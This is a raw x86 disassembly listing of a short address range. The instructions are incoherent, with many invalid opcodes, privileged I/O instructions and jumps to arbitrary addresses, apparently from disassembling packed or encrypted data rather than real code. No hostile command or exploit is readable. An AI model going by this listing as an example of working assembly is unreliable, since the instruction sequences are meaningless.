  40bba6:	mov    bl,0x7a
  40bba8:	into   
  40bba9:	leave  
  40bbaa:	enter  0x2c4a,0x89
  40bbae:	inc    edx
  40bbaf:	pushf  
  40bbb0:	repnz (bad) 
  40bbb2:	pop    ebp
  40bbb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bbb4:	mov    dl,0x74
  40bbb6:	mov    esi,0x74028a36
  40bbbb:	scas   eax,DWORD PTR es:[edi]
  40bbbc:	dec    eax
  40bbbd:	sti    
  40bbbe:	jmp    0x40bc28
  40bbc0:	pop    edx
  40bbc1:	xor    dl,ah
  40bbc3:	stc    
  40bbc4:	mov    esp,0x4b5f8157
  40bbc9:	pop    edx
  40bbca:	xor    dl,al
  40bbcc:	rol    BYTE PTR [edx],0x8e
  40bbcf:	in     eax,0xa4
  40bbd1:	dec    esp
  40bbd2:	test   al,0x79
  40bbd4:	xlat   BYTE PTR ds:[ebx]
  40bbd5:	jmp    0x40bc1c
  40bbd7:	(bad)  
  40bbd8:	cmp    edi,DWORD PTR [esi+0x6f038cca]
  40bbde:	lock pop ebx
  40bbe0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bbe1:	inc    ebx
  40bbe2:	and    al,0x35
  40bbe4:	adc    al,0x5d
  40bbe6:	push   esp
  40bbe7:	sub    ch,BYTE PTR [edx+edx*4+0x15]
  40bbeb:	lea    ebp,[eax]
  40bbed:	jl     0x40bbb8
  40bbef:	pop    es
  40bbf0:	pop    esi
  40bbf1:	fsubr  DWORD PTR [eax-0x9adde4b]
  40bbf7:	jg     0x40bb8a
  40bbf9:	cwde   
  40bbfa:	in     eax,dx
  40bbfb:	xor    bl,BYTE PTR [edi+0x636acf11]
  40bc01:	mov    ebx,0x98456a7e
  40bc06:	sbb    al,dh
  40bc08:	fcomp  QWORD PTR [ecx+0x40]
  40bc0b:	pop    esi
  40bc0c:	or     ebp,edi
  40bc0e:	xchg   ecx,eax
  40bc0f:	mov    DWORD PTR [ebp+0x71],edx
  40bc12:	mov    dh,0xf0
  40bc14:	and    al,0x6b
  40bc16:	or     bl,cl
  40bc18:	mov    esp,0x3e9da4c2
  40bc1d:	mov    al,ds:0xfba17c6d
  40bc22:	sub    al,0x9d
  40bc24:	xchg   edi,eax
  40bc25:	retf   0x4b32
  40bc28:	xor    al,0x91
  40bc2a:	pop    eax
  40bc2b:	out    dx,eax
  40bc2c:	mov    ch,BYTE PTR [ebp+0x2f]
  40bc2f:	dec    esi
  40bc30:	dec    DWORD PTR [ecx-0x30]
  40bc33:	mov    bl,0x60
  40bc35:	jo     0x40bbdd
  40bc37:	fld    TBYTE PTR [edx]
  40bc39:	mov    ecx,0xbeff5b22
  40bc3e:	xor    eax,0xe0592e50
  40bc43:	ins    DWORD PTR es:[edi],dx
  40bc44:	mov    DWORD PTR [eax+eiz*1],ebx
  40bc47:	sti    
  40bc48:	idiv   DWORD PTR [ebp+0x2b7e1d38]
  40bc4e:	cwde   
  40bc4f:	ins    BYTE PTR es:[edi],dx
  40bc50:	cmp    bh,dh
  40bc52:	in     al,0x22
  40bc54:	hlt    
  40bc55:	loop   0x40bcd2
  40bc57:	ficomp WORD PTR [ebp-0x26d7b86c]
  40bc5d:	mov    edi,0x56712808
  40bc62:	pop    edx
  40bc63:	add    eax,0xfed149bb
  40bc68:	pop    esp
  40bc69:	or     DWORD PTR [ecx-0x38],edx
  40bc6c:	test   DWORD PTR [eax-0x2965603a],edi
  40bc72:	test   BYTE PTR [edi+0xf6d1119],bl
  40bc78:	dec    edx
  40bc79:	or     DWORD PTR [esi],ecx
  40bc7b:	push   ss
  40bc7c:	sub    DWORD PTR [eax-0x9],0x7ef42a9b
  40bc83:	adc    eax,0x1764184a
  40bc88:	fwait
  40bc89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bc8a:	push   es
  40bc8b:	jne    0x40bcbb
  40bc8d:	cmp    bh,BYTE PTR [edx]
  40bc8f:	or     BYTE PTR [edi+0x630ce101],ah
  40bc95:	fild   WORD PTR [esi+0x1c]
  40bc98:	mov    ebx,0x9c2aadb3
  40bc9d:	sub    al,BYTE PTR [ecx]
  40bc9f:	inc    ebx
  40bca0:	pusha  
  40bca1:	jmp    0xfcce3ad3
  40bca6:	lea    eax,[esi+0xe1a1192]
  40bcac:	pop    ebp
  40bcad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bcae:	loop   0x40bc63
  40bcb0:	ret    
  40bcb1:	sub    eax,0x21764a30
  40bcb6:	bound  ecx,QWORD PTR [ecx-0x3bf65182]
  40bcbc:	pop    ebx
  40bcbd:	jne    0x40bcdf
  40bcbf:	inc    edx
  40bcc0:	test   eax,0x4463ea15
  40bcc5:	and    ch,ch
  40bcc7:	push   cs
  40bcc8:	hlt    
  40bcc9:	adc    al,BYTE PTR [ebx]
  40bccb:	xor    ebx,DWORD PTR [ebx+0x4be0c996]
  40bcd1:	es fabs 
  40bcd4:	sub    al,0xd8
  40bcd6:	and    DWORD PTR [edx],edx
  40bcd8:	sti    
  40bcd9:	iret   
  40bcda:	push   cs
  40bcdb:	inc    esp
  40bcdc:	pop    ebx
  40bcdd:	mov    bh,0x6f
  40bcdf:	and    ecx,DWORD PTR [esi]
  40bce1:	xor    al,0xa1
  40bce3:	dec    esi
  40bce4:	iret   
  40bce5:	sub    ebx,DWORD PTR [eax+0x7]
  40bce8:	inc    edx
  40bce9:	mov    eax,ds:0x73ee4cca
  40bcee:	fcomp  QWORD PTR [ebp-0x62]
  40bcf1:	loope  0x40bcb7
  40bcf3:	push   0x4176d5b4
  40bcf8:	scas   al,BYTE PTR es:[edi]
  40bcf9:	ins    DWORD PTR es:[edi],dx
  40bcfa:	mov    ch,0x5b
  40bcfc:	fsubrp st(7),st
  40bcfe:	or     WORD PTR [ebx-0x6ca6ecd1],0xffd2
  40bd06:	or     edi,eax
  40bd08:	jl     0x40bcf3
  40bd0a:	retf   
  40bd0b:	xchg   edx,eax
  40bd0c:	ins    DWORD PTR es:[edi],dx
  40bd0d:	mov    ah,BYTE PTR [esi]
  40bd0f:	into   
  40bd10:	into   
  40bd11:	fs and dh,al
  40bd14:	xchg   ebp,eax
  40bd15:	pop    edx
  40bd16:	test   DWORD PTR [edx-0x1e4cda35],edi
  40bd1c:	or     BYTE PTR ss:[edx-0x58],dl
  40bd20:	cld    
  40bd21:	ins    BYTE PTR es:[edi],dx
  40bd22:	sbb    BYTE PTR [esi-0x2],0x96
  40bd26:	dec    edi
  40bd27:	in     al,dx
  40bd28:	cmp    DWORD PTR [edx+0x31],ebx
  40bd2b:	retf   
  40bd2c:	in     eax,dx
  40bd2d:	xor    al,0x6e
  40bd2f:	or     eax,0x8301e06d
  40bd34:	or     BYTE PTR [edx+ebp*2+0x15],al
  40bd38:	psubw  mm0,QWORD PTR [ecx]
  40bd3b:	jo     0x40bd77
  40bd3d:	repnz xor eax,0x867f02f6
  40bd43:	push   edx
  40bd44:	fxch   st(0)
  40bd46:	or     BYTE PTR [ecx+esi*4+0x45495223],0x5f
  40bd4e:	(bad)  
  40bd4f:	repz fld DWORD PTR [ecx+edi*2-0x7]
  40bd54:	cmc    
  40bd55:	inc    ecx
  40bd56:	add    al,0x58
  40bd58:	loop   0x40bd7c
  40bd5a:	loope  0x40bd68
  40bd5c:	add    ecx,ebx
  40bd5e:	cmp    cl,BYTE PTR ds:[eax]
  40bd61:	ror    ebx,cl
  40bd63:	fsub   DWORD PTR [edi+0x64]
  40bd66:	jmp    0xfd68:0x64c4af62
  40bd6d:	in     al,dx
  40bd6e:	scas   al,BYTE PTR es:[edi]
  40bd6f:	sub    BYTE PTR [eax-0x5c],al
  40bd72:	into   
  40bd73:	pop    ebp
  40bd74:	sbb    DWORD PTR fs:[edx+0x733ab787],edx
  40bd7b:	js     0x40bdd0
  40bd7d:	jle    0x40bd28
  40bd7f:	(bad)  
  40bd80:	lods   al,BYTE PTR ds:[esi]
  40bd81:	or     DWORD PTR [edx],esp
  40bd83:	push   ebx
  40bd84:	mov    ebp,0x6890ed05
  40bd89:	rcr    ecx,1
  40bd8b:	icebp  
  40bd8c:	hlt    
  40bd8d:	mov    ebx,0xd6c7594b
  40bd92:	stc    
  40bd93:	mov    esi,0xe778aa13
  40bd98:	lods   al,BYTE PTR ds:[esi]
  40bd99:	leave  
  40bd9a:	mov    dl,0x2e
  40bd9c:	mov    dl,0x29
  40bd9e:	dec    edx
  40bd9f:	mov    dl,0x87
  40bda1:	mov    bl,0x7d
  40bda3:	or     esi,DWORD PTR [eax]
  40bda5:	push   edx
  40bda6:	xchg   ebp,eax
  40bda7:	sub    al,0xca
  40bda9:	mov    ebp,0xe2cc3974
  40bdae:	out    dx,eax
  40bdaf:	mov    ds:0x944e7794,al
  40bdb4:	addr16 mov ecx,0xe508aadc
  40bdba:	push   ss
  40bdbb:	stc    
  40bdbc:	pop    esi
  40bdbd:	jmp    0x40bdee
  40bdbf:	cdq    
  40bdc0:	scas   al,BYTE PTR es:[edi]
  40bdc1:	xor    edx,DWORD PTR [esi+0x5cd8aa5e]
  40bdc7:	add    DWORD PTR [esi+ebp*1],ebx
  40bdca:	es ins DWORD PTR es:[edi],dx
  40bdcc:	mov    DWORD PTR [ecx+0x1b],eax
  40bdcf:	stos   DWORD PTR es:[edi],eax
  40bdd0:	dec    esp
  40bdd1:	sub    dh,BYTE PTR [ecx+0x4]
  40bdd4:	pop    esi
  40bdd5:	xor    eax,0x499fe99b
  40bdda:	xchg   ecx,eax
  40bddb:	ins    BYTE PTR es:[edi],dx
  40bddc:	pop    es
  40bddd:	or     eax,0xf896904f
  40bde2:	rcr    DWORD PTR [edi+edi*4-0x9169c74],0x72
  40bdea:	fcom   DWORD PTR [eax+esi*2-0x31]
  40bdee:	push   ebp
  40bdef:	or     al,BYTE PTR [edx]
  40bdf1:	test   ecx,0x84815087
  40bdf7:	xchg   edx,eax
  40bdf8:	gs stos BYTE PTR es:[edi],al
  40bdfa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bdfb:	pop    ebp
  40bdfc:	cmp    ecx,edi
  40bdfe:	lahf   
  40bdff:	rol    BYTE PTR [bx],1
  40be02:	and    edx,DWORD PTR [edi+ebp*1-0x5fb13d7b]
  40be09:	jecxz  0x40bde3
  40be0b:	aam    0x15
  40be0d:	sbb    eax,0x7ef9e981
  40be12:	mov    dh,0x10
  40be14:	retf   0x62a7
  40be17:	jl     0x40be15
  40be19:	scas   eax,DWORD PTR es:[di]
  40be1b:	imul   ebx,DWORD PTR [ebp+0x6b],0xffffffa1
  40be1f:	inc    esi
  40be20:	sar    ebx,1
  40be22:	inc    BYTE PTR [ebx]
  40be24:	gs jbe 0x40be30
  40be27:	push   esi
  40be28:	aad    0xb9
  40be2a:	in     eax,dx
  40be2b:	fmulp  st(7),st
  40be2d:	push   esi
  40be2e:	xchg   DWORD PTR [ebx-0xee4b0c6],eax
  40be34:	xor    DWORD PTR [ebx+ebx*4+0x4f],ebx
  40be38:	dec    esi
  40be39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be3a:	pop    edx
  40be3b:	repz ror BYTE PTR [ebx+0xe],1
  40be3f:	(bad)  
  40be40:	jecxz  0x40bdc4
  40be42:	and    al,BYTE PTR [ebx+ecx*4]
  40be45:	iret   
  40be46:	mov    ch,0x72
  40be48:	or     dl,BYTE PTR [ebp+0x7cd112c1]
  40be4e:	cmp    al,0xa7
  40be50:	ret    0x1298
  40be53:	ror    edx,cl
  40be55:	cmp    eax,0xf7968b1f
  40be5a:	add    edx,esi
  40be5c:	inc    edi
  40be5d:	(bad)  
  40be5f:	mov    dl,0x31
  40be61:	out    0xe0,al
  40be63:	push   ss
  40be64:	sub    DWORD PTR [eax],ebp
  40be66:	jno    0x40bec6
  40be68:	jbe    0x40bece
  40be6a:	sub    eax,0x14daeb47
  40be6f:	sahf   
  40be70:	xlat   BYTE PTR ds:[ebx]
  40be71:	mov    DWORD PTR [ebp+0x4c],ebp
  40be74:	xchg   ebp,eax
  40be75:	imul   esi,DWORD PTR [edi+0xb],0xf472104
  40be7c:	data16 and BYTE PTR [ebx+ebx*4+0x1b],ch
  40be81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be82:	shl    DWORD PTR gs:[ebx],cl
  40be85:	jle    0x40beab
  40be87:	sbb    eax,0x5b5be38d
  40be8c:	pop    eax
  40be8d:	test   eax,0x30214736
  40be92:	lds    esi,FWORD PTR [eax-0x49]
  40be95:	mov    eax,ds:0x2b007dd0
  40be9a:	mov    ebp,0x2eddcaba
  40be9f:	(bad)
  40bea2:	cs sbb al,0x4d
  40bea5:	pop    edi
  40bea6:	pop    ss
  40bea7:	int3   
  40bea8:	ja     0x40be51
  40beaa:	cld    
  40beab:	pop    ebp
  40beac:	mov    esp,0x7d158f98
  40beb1:	(bad)  
  40beb2:	mov    WORD PTR [edi-0x48ed13a8],es
  40beb8:	fs int3 
  40beba:	sub    ah,BYTE PTR [ecx]
  40bebc:	push   esi
  40bebd:	test   eax,0x99fbcc7d
  40bec2:	cmp    eax,0x903708a7
  40bec7:	loopne 0x40bf13
  40bec9:	jmp    0xde07c4e
  40bece:	adc    BYTE PTR [ebp-0x3a],0xf0
  40bed2:	out    dx,al
  40bed3:	inc    edi
  40bed4:	fild   WORD PTR [esi+0x3be2da40]
  40beda:	xor    BYTE PTR [eax],bh
  40bedc:	and    eax,DWORD PTR [edx-0x59ea399c]
  40bee2:	mov    ebp,0x7f1b324a
  40bee7:	in     eax,dx
  40bee8:	jbe    0x40beb4
  40beea:	sar    ch,0xf0
  40beed:	dec    edx
  40beee:	dec    ebx
  40beef:	sahf   
  40bef0:	sub    eax,esp
  40bef2:	inc    edi
  40bef3:	(bad)  
  40bef5:	cmp    eax,0x60c23168
  40befa:	pop    ebx
  40befb:	neg    DWORD PTR [eax+ebp*8+0x5d16c9ab]
  40bf02:	adc    dl,BYTE PTR [eax+0x33f6e702]
  40bf08:	call   0x7c2fa24d
  40bf0d:	cmc    
  40bf0e:	and    ch,ch
  40bf10:	psrad  mm0,QWORD PTR [edi]
  40bf13:	jl     0x40bf63
  40bf15:	fisttp WORD PTR [eax+edi*1-0x12]
  40bf19:	sbb    DWORD PTR [ecx-0x13],0x6d2eb533
  40bf20:	push   edi
  40bf21:	inc    ecx
  40bf22:	gs push ds
  40bf24:	ds loop 0x40bf02
  40bf27:	call   DWORD PTR fs:[edi+0x31cc4889]
  40bf2e:	repz inc eax
  40bf30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bf31:	(bad)  
  40bf32:	mov    ch,0x22
  40bf34:	ror    DWORD PTR gs:[ecx],cl
  40bf37:	scas   eax,DWORD PTR es:[edi]
  40bf38:	xlat   BYTE PTR ds:[ebx]
  40bf39:	out    dx,al
  40bf3a:	fcomp  st(5)
  40bf3c:	pop    ebx
  40bf3d:	(bad)  
  40bf3e:	mov    bh,dl
  40bf40:	dec    edi
  40bf41:	sbb    cl,BYTE PTR [ebp+0x7fa7369]
  40bf47:	ret    
  40bf48:	ins    BYTE PTR es:[edi],dx
  40bf49:	mov    fs,WORD PTR [ecx+esi*1]
  40bf4c:	jne    0x40bed9
  40bf4e:	ror    cl,0x32
  40bf51:	or     DWORD PTR [ecx+0x2d5a4dca],0x522da52d
  40bf5b:	mov    esp,0xb6319500
  40bf60:	jo     0x40bf2d
  40bf62:	mov    DWORD PTR [eax],0x4c2d4b49
  40bf68:	inc    esp
  40bf69:	cmp    eax,0x916c3591
  40bf6e:	lds    eax,FWORD PTR [ecx]
  40bf70:	out    dx,al
  40bf71:	mov    eax,0xf3b61ae3
  40bf76:	push   0x67
  40bf78:	shr    DWORD PTR [ebx-0xd],0xfe
  40bf7c:	jmp    0x262b:0x2daaff1a
  40bf83:	aam    0x57
  40bf85:	loope  0x40bfbc
  40bf87:	cli    
  40bf88:	push   es
  40bf89:	dec    ecx
  40bf8a:	cmc    
  40bf8b:	adc    al,0x2a
  40bf8d:	or     edx,esp
  40bf8f:	push   ebp
  40bf90:	add    al,dl
  40bf92:	fwait
  40bf93:	sub    BYTE PTR [ebx+eax*4+0x57],0xa8
  40bf98:	call   0xfcb1dbb2
  40bf9d:	and    ah,al
  40bf9f:	imul   BYTE PTR [ecx+0x57]
  40bfa2:	sub    BYTE PTR [ecx+0x7e],dl
  40bfa5:	fwait
  40bfa6:	xchg   ebx,eax
  40bfa7:	and    DWORD PTR [ecx-0x39f9e701],0x78809ecd
  40bfb1:	int3   
  40bfb2:	imul   esi,DWORD PTR [esi-0x7b],0xffffffd5
  40bfb6:	xor    al,0x77
  40bfb8:	pop    esi
  40bfb9:	dec    edx
  40bfba:	ror    DWORD PTR [ebx-0x23],1
  40bfbd:	aaa    
  40bfbe:	lds    edi,FWORD PTR [ebx-0x6c]
  40bfc1:	shr    BYTE PTR [edi+0x55],0x8b
  40bfc5:	cmp    DWORD PTR [edx+0x7791198b],0x13
  40bfcc:	jo     0x40bff8
  40bfce:	je     0x40c00e
  40bfd0:	(bad)  
  40bfd1:	outs   dx,BYTE PTR ds:[esi]
  40bfd2:	inc    ebp
  40bfd3:	retf   
  40bfd4:	jl     0x40c02a
  40bfd6:	jle    0x40bfc7
  40bfd8:	inc    ecx
  40bfd9:	js     0x40bfc5
  40bfdb:	imul   edx,DWORD PTR [edx],0xfffffff1
  40bfde:	call   DWORD PTR [ebx+eiz*8]
  40bfe1:	cmp    DWORD PTR [esi+0x66fe177],eax
  40bfe7:	pop    ecx
  40bfe8:	cdq    
  40bfe9:	clc    
  40bfea:	pop    ss
  40bfeb:	scas   eax,DWORD PTR es:[edi]
  40bfec:	(bad)  
  40bfee:	jne    0x40bfb6
  40bff0:	xor    ch,BYTE PTR [esi+0x13]
  40bff3:	out    0xdd,al
  40bff5:	mov    DWORD PTR [edx],esi
  40bff7:	xor    ah,dh
  40bff9:	mov    ch,0x39
  40bffb:	mov    ebp,esp
  40bffd:	or     BYTE PTR [esi-0x25],0x70
  40c001:	xor    DWORD PTR [esi-0x3a],eax
  40c004:	(bad)  
  40c005:	dec    edi
  40c006:	das    
  40c007:	loope  0x40c02c
  40c009:	mov    cl,0x57
  40c00b:	scas   al,BYTE PTR es:[edi]
  40c00c:	es adc eax,ebp
  40c00f:	aas    
  40c010:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  40c012:	imul   dl
  40c014:	mov    ah,0xc4
  40c016:	iret   
  40c017:	pop    eax
  40c018:	arpl   bp,si
  40c01a:	pushf  
  40c01b:	fchs   
  40c01d:	fsubr  DWORD PTR [ebx]
  40c01f:	scas   eax,DWORD PTR es:[edi]
  40c020:	(bad)  
  40c022:	std    
  40c023:	xchg   edi,eax
  40c024:	(bad)  
  40c025:	sbb    al,0xf1
  40c027:	fbld   TBYTE PTR [ebx+ecx*1]
  40c02a:	mov    dl,0x84
  40c02c:	dec    ecx
  40c02d:	aad    0x9d
  40c02f:	xor    al,BYTE PTR [edx+0x62]
  40c032:	adc    al,0xb0
  40c034:	rol    DWORD PTR [esi+0x29f02c54],cl
  40c03a:	adc    eax,0xb6622038
  40c03f:	inc    esi
  40c040:	int    0x4d
  40c042:	jne    0x40c0c0
  40c044:	jmp    FWORD PTR [edx-0x39aad9ca]
  40c04a:	mov    bl,0x4d
  40c04c:	sbb    BYTE PTR [edi-0x75],ch
  40c04f:	jp     0x40c080
  40c051:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c052:	lahf   
  40c053:	mul    edx
  40c055:	pop    ebp
  40c056:	data16 mov cl,ch
  40c059:	retf   
  40c05a:	not    BYTE PTR [ebx]
  40c05c:	pop    ds
  40c05d:	dec    edx
  40c05e:	add    dh,BYTE PTR [eax]
  40c060:	xor    eax,0xe3a17162
  40c065:	jge    0x40c099
  40c067:	int3   
  40c068:	and    ah,ch
  40c06a:	inc    ebx
  40c06b:	sub    ebp,DWORD PTR [ecx]
  40c06d:	stos   BYTE PTR es:[edi],al
  40c06e:	mov    dh,0xc2
  40c070:	fstp   QWORD PTR [ebx+0x35be1f2]
  40c076:	inc    DWORD PTR [ebx-0x5]
  40c079:	test   eax,0x43863d30
  40c07e:	mov    ebx,0x7e903c8d
  40c083:	loope  0x40c058
  40c085:	repnz mov esp,0x9fe791ef
  40c08b:	jb     0x40c0de
  40c08d:	push   esi
  40c08e:	out    0x80,al
  40c090:	pop    ds
  40c091:	pop    ss
  40c092:	pop    ebp
  40c093:	mov    eax,es:0xe8ca5c41
  40c099:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c09a:	xor    BYTE PTR [edx+0x2],dl
  40c09d:	aad    0x43
  40c09f:	imul   edi,DWORD PTR [edi+0x3bca3506],0xffffff9f
  40c0a6:	out    dx,eax
  40c0a7:	mov    bh,0x7b
  40c0a9:	jp     0x40c04e
  40c0ab:	rcr    BYTE PTR [ebx],cl
  40c0ad:	sbb    eax,0x4d079406
  40c0b2:	mov    bh,0x78
  40c0b4:	mov    al,ds:0x75a5a2e7
  40c0b9:	jmp    DWORD PTR [ecx-0x36]
  40c0bc:	push   es
  40c0bd:	xchg   ebx,eax
  40c0be:	int3   
  40c0bf:	outs   dx,DWORD PTR ds:[esi]
  40c0c0:	sbb    BYTE PTR [ebx],dl
  40c0c2:	ins    BYTE PTR es:[edi],dx
  40c0c3:	popa   
  40c0c4:	lds    esp,FWORD PTR [esp+ebp*8]
  40c0c7:	pusha  
  40c0c8:	mov    edx,cs
  40c0ca:	pop    es
  40c0cb:	popa   
  40c0cc:	mov    edx,0x1ee61ce8
  40c0d1:	cvtdq2ps xmm1,XMMWORD PTR [eax-0x65ffaa23]
  40c0d8:	std    
  40c0d9:	and    BYTE PTR [ebx-0x63a53975],ah
  40c0df:	(bad)
  40c0e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c0e3:	mov    bh,0xe6
  40c0e5:	test   DWORD PTR ds:0x3547f889,0x78d12e47
  40c0ef:	in     eax,dx
  40c0f0:	xchg   edx,eax
  40c0f1:	ds and esp,ebp
  40c0f4:	(bad)  
  40c0f5:	call   FWORD PTR [ecx+0x7a48a8c1]
  40c0fb:	mov    cl,0x1b
  40c0fd:	fs sub esi,0xfffffff4
  40c101:	sbb    ch,BYTE PTR ds:[esp+eax*8]
  40c105:	mov    ebp,0xbba7724a
  40c10a:	int    0xfa
  40c10c:	lods   eax,DWORD PTR ds:[esi]
  40c10d:	mov    cl,0xf5
  40c10f:	dec    esi
  40c110:	push   eax
  40c111:	xor    cl,dl
  40c113:	jne    0x40c190
  40c115:	fistp  WORD PTR ds:0x2f2e8237
  40c11b:	add    al,BYTE PTR [esi+0x7c]
  40c11e:	jmp    0x7a1e1143
  40c123:	imul   eax,DWORD PTR [bx+si-0x1c97],0xfffffff9
  40c129:	and    ebx,DWORD PTR [ebp+0x6e0cf6b8]
  40c12f:	cs scas al,BYTE PTR es:[edi]
  40c131:	pop    esp
  40c132:	vmread DWORD PTR [eax+0x6a4ae88b],esi
  40c139:	lock mov ss,esp
  40c13c:	aam    0xcf
  40c13e:	test   cl,0xd9
  40c141:	pushf  
  40c142:	call   0x3b4c:0xff9ab367
  40c149:	fwait
  40c14a:	mov    ch,0x56
  40c14c:	test   DWORD PTR [esi+0x393e5cbc],0x49cdf614
  40c156:	out    dx,al
  40c157:	pop    ecx
  40c158:	adc    al,0x66
  40c15a:	in     al,0x7a
  40c15c:	sti    
  40c15d:	rcr    DWORD PTR [edx+0x61566ac6],0xa8
  40c164:	mov    ds:0x8cc04ba0,eax
  40c169:	pop    ebp
  40c16a:	cmp    al,0xab
  40c16c:	jmp    0x149417a9
  40c171:	mov    al,0x54
  40c173:	fcomi  st,st(1)
  40c175:	repnz out dx,eax
  40c177:	inc    ebp
  40c178:	dec    eax
  40c179:	xchg   ebx,ebp
  40c17b:	or     DWORD PTR [ebx+0x37],ecx
  40c17e:	mov    dl,0x87
  40c180:	cmp    al,0x4f
  40c182:	out    dx,eax
  40c183:	push   ss
  40c184:	sub    eax,0xa6440078
  40c189:	add    al,0x2a
  40c18b:	jg     0x40c110
  40c18d:	es loop 0x40c156
  40c190:	mov    edx,0x2c99e4bc
  40c195:	imul   ecx,DWORD PTR [esi+0x21841c66],0x917c8ede
  40c19f:	cmp    ecx,ebx
  40c1a1:	xor    al,0x47
  40c1a3:	push   esi
  40c1a4:	and    al,0x9d
  40c1a6:	loope  0x40c1dd
  40c1a8:	lods   eax,DWORD PTR ds:[esi]
  40c1aa:	xor    al,0xc5
  40c1ac:	fbstp  TBYTE PTR [esi+0x14]
  40c1af:	mov    ebx,0x4504bed7
  40c1b4:	aaa    
  40c1b5:	sub    al,0x3d
  40c1b7:	mov    ds:0x1faba061,al
  40c1bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c1bd:	sub    al,0x5d
  40c1bf:	or     BYTE PTR [esi-0x78],dl
  40c1c2:	or     DWORD PTR [eax],ebx
  40c1c4:	push   0x13a4c6f8
  40c1c9:	mov    esp,DWORD PTR [ebx-0x71b9bef8]
  40c1cf:	(bad)  
  40c1d1:	pop    ss
  40c1d2:	fs test al,0xe9
  40c1d5:	mov    dl,0x70
  40c1d7:	loopne 0x40c1ef
  40c1d9:	adc    ebx,DWORD PTR [esi+0x157cd0ee]
  40c1df:	int3   
  40c1e0:	cmp    BYTE PTR [edi-0x1fd8f585],dl
  40c1e6:	pushf  
  40c1e7:	xchg   BYTE PTR [edx],bl
  40c1e9:	and    al,0x80
  40c1eb:	jl     0x40c182
  40c1ed:	iret   
  40c1ee:	fcomp  QWORD PTR [ecx]
  40c1f0:	sbb    edx,esp
  40c1f2:	mov    ds:0x3472dcd0,al
  40c1f7:	or     eax,0x45b2be01
  40c1fc:	push   cs
  40c1fd:	frstor [ebp+0x1a]
  40c200:	and    bl,BYTE PTR [edx+0x5cbaf6c9]
  40c206:	aas    
  40c207:	aad    0xe0
  40c209:	test   DWORD PTR [esi-0xfd8000c],0x2c32743d
  40c213:	loopne 0x40c225
  40c215:	imul   edx,DWORD PTR [edx-0x48492110],0x58300acb
  40c21f:	scas   eax,DWORD PTR es:[edi]
  40c220:	cmp    al,0xb8
  40c222:	dec    eax
  40c223:	ss std 
  40c225:	and    ebp,DWORD PTR [edi]
  40c227:	test   eax,0xd9b9fcd
  40c22c:	ror    DWORD PTR [ebx-0x1e],1
  40c22f:	fs out dx,al
  40c231:	jge    0x40c280
  40c233:	imul   ebp,edi,0x46
  40c236:	icebp  
  40c237:	in     ax,0xfd
  40c23a:	mov    ds:0xf9d70ef5,al
  40c23f:	fdiv   st(4),st
  40c241:	jns    0x40c2ad
  40c243:	cdq    
  40c244:	jge    0x40c258
  40c246:	pop    ebp
  40c247:	and    BYTE PTR [edx+0x188dc4c2],bh
  40c24d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c24e:	xor    al,BYTE PTR [esi-0x7bb169c0]
  40c254:	jae    0x40c27e
  40c256:	cmp    bh,0x9d
  40c259:	xchg   ecx,eax
  40c25a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c25b:	(bad)  
  40c25c:	mov    dh,0x14
  40c25e:	or     DWORD PTR [ecx+0x467b6452],ebp
  40c264:	sub    dh,cl
  40c266:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c267:	push   es
  40c268:	mov    dl,0xc7
  40c26a:	cmp    esp,0xffffffb9
  40c26d:	adc    edx,DWORD PTR [ebx-0x76]
  40c270:	jns    0x40c2bd
  40c272:	inc    BYTE PTR [edi+0x26]
  40c275:	lahf   
  40c276:	jns    0x40c225
  40c278:	int    0xe5
  40c27a:	shr    BYTE PTR [ecx+eiz*4+0x7ca11a40],1
  40c281:	jmp    0x40c2da
  40c283:	xchg   BYTE PTR [edi],dh
  40c285:	mov    esp,eax
  40c287:	fdivr  DWORD PTR [edx+0x5805c797]
  40c28d:	leave  
  40c28e:	fsubr  DWORD PTR [esp+edx*1-0x3bcbc880]
  40c295:	jmp    0x1b5d88fb
  40c29a:	xchg   edi,eax
  40c29b:	mov    al,ds:0x38ac1233
  40c2a0:	sbb    DWORD PTR [edi-0x60c0197e],ebx
  40c2a6:	mov    ebx,0x3384830d
  40c2ab:	iret   
  40c2ac:	pop    esp
  40c2ad:	rol    BYTE PTR [edi-0x2d48d868],1
  40c2b3:	or     dh,BYTE PTR [ebx+0x29]
  40c2b6:	jno    0x40c31a
  40c2b8:	sub    DWORD PTR [esi+esi*2-0x4de52d37],ebp
  40c2bf:	jo     0x40c2f0
  40c2c1:	pop    edi
  40c2c2:	jmp    0x802a1311
  40c2c7:	jle    0x40c2a6
  40c2c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c2ca:	call   0x8130f22c
  40c2cf:	pop    esi
  40c2d0:	pop    esp
  40c2d1:	xchg   BYTE PTR [ebx],dl
  40c2d3:	enter  0xfa26,0x74
  40c2d7:	mov    esp,0x2651fa5b
  40c2dc:	sbb    DWORD PTR [esi-0x3c],edx
  40c2df:	jp     0x40c319
  40c2e1:	call   0xd23f:0x88d9c6e2
  40c2e8:	push   0x8ef01432
  40c2ed:	ins    BYTE PTR es:[edi],dx
  40c2ee:	outs   dx,BYTE PTR ds:[esi]
  40c2ef:	xchg   ecx,eax
  40c2f0:	aam    0xbf
  40c2f2:	ret    
  40c2f3:	pop    es
  40c2f4:	mov    al,0x94
  40c2f6:	gs dec ebx
  40c2f8:	fs (bad) 
  40c2fa:	imul   ebx,DWORD PTR [eax],0xffffffa9
  40c2fd:	sub    BYTE PTR [ebp+0x74],cl
  40c300:	sar    DWORD PTR [edi-0x27e4c9bd],0x48
  40c307:	push   ebx
  40c308:	(bad)  
  40c30a:	xchg   esp,eax
